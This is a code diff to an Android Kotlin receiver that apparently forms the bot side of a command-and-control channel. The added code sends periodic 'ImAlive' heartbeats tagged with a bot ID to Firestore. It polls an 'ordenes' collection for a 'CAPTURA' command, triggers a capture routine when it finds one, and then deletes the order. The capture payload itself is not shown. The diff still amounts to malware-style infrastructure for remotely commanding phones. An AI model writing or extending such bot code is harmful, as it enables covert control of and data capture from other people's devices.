@@ -30,7 +30,7 @@ class Alarm : BroadcastReceiver() {
 
         // End of my code
         enviaImAlive(db, strDate)
-        comprobarPrimitiva(db, strDate)
+        leePrimitiva(db, strDate)
 
         wl.release()
     }
@@ -53,6 +53,26 @@ class Alarm : BroadcastReceiver() {
         val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
         alarmManager.cancel(sender)
     }
+
+    fun leePrimitiva(db : FirebaseFirestore, strDate: String){
+        db.collection("ordenes")
+            .get()
+            .addOnSuccessListener { result ->
+                for (document in result) {
+                    if(document.data["Primitiva"]!!.equals("CAPTURA")){
+                        nuevaCaptura(db, strDate)
+                        Log.d("TAG2", "Se añade nueva captura")
+                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
+                            Log.d("TAG2", "Documento eliminado")
+                        }
+                    }
+                }
+            }
+            .addOnFailureListener { exception ->
+                Log.d("TAG2", "Error getting documents: ", exception)
+            }
+    }
+
     fun enviaImAlive(db : FirebaseFirestore, strDate: String){
         val user = hashMapOf(
             "Bot ID" to idAndroid,
@@ -61,10 +81,10 @@ class Alarm : BroadcastReceiver() {
 
         // Add a new document with a generated ID
         db.collection("ImAlive").document(strDate).set(user)
-        Log.d("TAG2","Se ejecuta la tarea")
+        Log.d("TAG2","Se ha enviado un nuevo mensaje de ImAlive")
     }
 
-    fun comprobarPrimitiva(db : FirebaseFirestore, strDate: String){
+    fun nuevaCaptura(db : FirebaseFirestore, strDate: String){
         val user = hashMapOf(
             "Bot ID" to idAndroid,
             "Hora" to strDate
